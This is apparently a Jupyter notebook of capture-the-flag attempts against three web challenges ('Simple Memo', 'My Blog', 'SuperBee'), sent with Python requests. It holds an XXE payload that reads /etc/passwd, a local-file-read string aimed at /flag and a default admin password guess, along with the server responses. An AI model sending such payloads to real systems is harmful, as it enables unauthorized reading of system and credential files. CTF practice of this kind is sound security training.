{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "import requests\n",
    "import pprint"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b\"<script>\\nalert('welcome')\\n;location.href='/memo/list';\\n</script>\\n\""
      ]
     },
     "execution_count": 98,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'http://3.39.72.134/memo/login'\n",
    "params = {'name': 'hyeonMo3'}\n",
    "s = requests.Session()\n",
    "s.post(url, params).content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\n<!doctype html>\\n<html lang=\"en\">\\n  <head>\\n    <meta charset=\"utf-8\">\\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\\n    <title>Simple Memo</title>\\n    <link href=\"/static/css/bootstrap.min.css\" rel=\"stylesheet\">\\n    <style>\\n        /* Sticky footer styles\\n-------------------------------------------------- */\\nhtml {\\n  position: relative;\\n  min-height: 100%;\\n}\\nbody {\\n  margin-bottom: 60px; /* Margin bottom by footer height */\\n}\\n.footer {\\n  position: absolute;\\n  bottom: 0;\\n  width: 100%;\\n  height: 60px; /* Set the fixed height of the footer here */\\n  line-height: 60px; /* Vertically center the text there */\\n  background-color: #f5f5f5;\\n}\\n\\n\\n/* Custom page CSS\\n-------------------------------------------------- */\\n/* Not required for template or sticky footer method. */\\n\\n.container {\\n  width: auto;\\n  max-width: 680px;\\n  padding: 0 15px;\\n}\\n    </style>\\n  </head>\\n<body>\\n      <!-- Begin page content -->\\n    <main role=\"main\" class=\"container\">\\n        \\n    </main>\\n</body>\\n</html>\\n'"
      ]
     },
     "execution_count": 99,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "readUrl = 'http://3.39.72.134/memo/read'\n",
    "params = {'idx': 3326}\n",
    "s.get(readUrl).content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b\"<script>\\nalert('write')\\n;location.href='/memo/list';\\n</script>\\n\""
      ]
     },
     "execution_count": 100,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "writeUrl = 'http://3.39.72.134/memo/write'\n",
    "params = {'memo': '[url:file:/flag/]'}\n",
    "s.post(writeUrl, params).content"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 여기서 부터 myBlog"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b\"<script>\\nalert('register ok')\\n;location.href='/blog/write';</script>\\n\""
      ]
     },
     "execution_count": 77,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'http://3.39.79.180/blog/register'\n",
    "params = {'id': 'jaeyeol2', 'pw': '1234'}\n",
    "s = requests.Session()\n",
    "s.post(url, params).content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b\"<script>\\nalert('login ok')\\n;location.href='/blog/write';</script>\\n\""
      ]
     },
     "execution_count": 80,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'http://3.39.79.180/blog/login'\n",
    "params = {'id': 'jaeyeol2', 'pw': '1234'}\n",
    "s = requests.Session()\n",
    "s.post(url, params).content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b\"<script>\\nalert('write ok')\\n;location.href='/';</script>\\n\""
      ]
     },
     "execution_count": 81,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'http://3.39.79.180/blog/write'\n",
    "params = {'title': '2222222', 'content': '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n",
    "<!DOCTYPE foo [\n",
    "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n",
    "<userInfo>\n",
    "  <email>John.Smith@gmail.com</email>\n",
    "  <content>John</content>\n",
    "  <title>&xxe;</title>\n",
    " </userInfo>'''}\n",
    "s.post(url, params).content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'User-Agent': 'python-requests/2.26.0', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}"
      ]
     },
     "execution_count": 58,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s.headers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\n<!doctype html>\\n<html lang=\"en\">\\n  <head>\\n    <meta charset=\"utf-8\">\\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\\n    <title>My Blog</title>\\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css\" crossorigin=\"anonymous\">\\n    <style>\\n        /* Sticky footer styles\\n-------------------------------------------------- */\\nhtml {\\n  position: relative;\\n  min-height: 100%;\\n}\\nbody {\\n  margin-bottom: 60px; /* Margin bottom by footer height */\\n}\\n.footer {\\n  position: absolute;\\n  bottom: 0;\\n  width: 100%;\\n  height: 60px; /* Set the fixed height of the footer here */\\n  line-height: 60px; /* Vertically center the text there */\\n  background-color: #f5f5f5;\\n}\\n\\n\\n/* Custom page CSS\\n-------------------------------------------------- */\\n/* Not required for template or sticky footer method. */\\n\\n.container {\\n  width: auto;\\n  max-width: 680px;\\n  padding: 0 15px;\\n}\\n    </style>\\n  </head>\\n<body>\\n    \\n      <!-- Begin page content -->\\n    <main role=\"main\" class=\"container\">\\n        \\n        2222222\\n        <hr>\\n        <?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n<!DOCTYPE foo [\\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\\n<userInfo>\\n  <email>John.Smith@gmail.com</email>\\n  <firstName>John</firstName>\\n  <title>&xxe;</title>\\n </userInfo>\\n        \\n    </main>\\n</body>\\n</html>'"
      ]
     },
     "execution_count": 85,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'http://3.39.79.180/blog/read?idx=1'#]/userInfo['\n",
    "s.get(url).content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\n<!doctype html>\\n<html lang=\"en\">\\n  <head>\\n    <meta charset=\"utf-8\">\\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\\n    <title>My Blog</title>\\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css\" crossorigin=\"anonymous\">\\n    <style>\\n        /* Sticky footer styles\\n-------------------------------------------------- */\\nhtml {\\n  position: relative;\\n  min-height: 100%;\\n}\\nbody {\\n  margin-bottom: 60px; /* Margin bottom by footer height */\\n}\\n.footer {\\n  position: absolute;\\n  bottom: 0;\\n  width: 100%;\\n  height: 60px; /* Set the fixed height of the footer here */\\n  line-height: 60px; /* Vertically center the text there */\\n  background-color: #f5f5f5;\\n}\\n\\n\\n/* Custom page CSS\\n-------------------------------------------------- */\\n/* Not required for template or sticky footer method. */\\n\\n.container {\\n  width: auto;\\n  max-width: 680px;\\n  padding: 0 15px;\\n}\\n    </style>\\n  </head>\\n<body>\\n    \\n      <!-- Begin page content -->\\n    <main role=\"main\" class=\"container\">\\n        \\n        \\n        <hr>\\n        \\n        \\n    </main>\\n</body>\\n</html>'"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'http://3.39.79.180/blog/read?idx=1'\n",
    "s.get(url).content"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 여기서부터 SuperBee"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'<html>\\n    <head>\\n        <title>superbee</title>\\n    </head>\\n    <body>\\n        <h3>Login</h3>\\n        <form action=\"./auth\" method=\"post\">\\n            ID : <input type=\"text\" name=\"id\"><br>\\n            PW : <input type=\"password\" name=\"password\"><br>\\n            <input type=\"submit\" value=\"login\">\\n        </form>\\n    </body>\\n</html>'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'http://3.39.49.174:30001/login/auth'\n",
    "params = {'id': 'admin', 'password': '1234'}\n",
    "s = requests.Session()\n",
    "s.post(url, params).content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'Not Local'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'http://3.39.49.174:30001/admin/authkey'\n",
    "s.get(url).content"
   ]
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "2be5faf79681da6f2a61fdfdd5405d65d042280f7fba6178067603e3a2925119"
  },
  "kernelspec": {
   "display_name": "Python 3.10.1 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.1"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
